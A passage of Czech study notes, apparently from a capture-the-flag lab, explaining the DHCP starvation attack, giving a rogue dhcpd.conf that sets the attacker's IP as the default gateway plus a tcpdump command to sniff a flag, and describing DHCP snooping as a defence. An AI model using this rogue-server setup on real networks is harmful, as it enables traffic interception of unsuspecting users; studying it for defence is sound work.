drzi si MAC, IP, cas, whitelist...

`DHCP` je **broadcastovy** protokol  
Klient posle `DHCPDISCOVER` → kdokoli muze odpovedet `DHCPOFFER`. Vyhrava ten, kdo odpovi prvni.

## DHCP starvation attack
spociva v tom, ze si utocnik vycerpa vsechny IP adresy skutecneho DHCP serveru a nasledne pri pripojeni noveho zarizeni DHCP server rekne, ze uz nema volne a proto mu IP adresu (vcetne default gateway, DNS, subnet...) prideli utocnik

## utok: 
`/eth/dhcp/dhcpd.conf`

``` config
authoritative;

option domain-name "example.org";
option domain-name-servers 1.1.1.1, 8.8.8.8;


default-lease-time 300;
max-lease-time 3600;

ddns-update-style none;


subnet 192.168.0.0 netmask 255.255.255.0 { # sit, kterou chceme otravit
    range 192.168.0.10 192.168.0.99; # rozsah
    option routers 192.168.0.163; # NASE IP, toto je klicove
}
```

``` bash
tcpdump -vvv -A -i <rozhrani> | grep haxagon # ziskame vlajku
```

## obrana:
### DHCP Snooping (na switchi)
**Switch**:
- sleduje DHCP komunikaci 
- povolí odpovědi jen z důvěryhodných portů
- ostatní porty blokuje
Trusted port = port, kde je skutečný DHCP server.

[[DHCP config (linux)]]
[[MITM]]
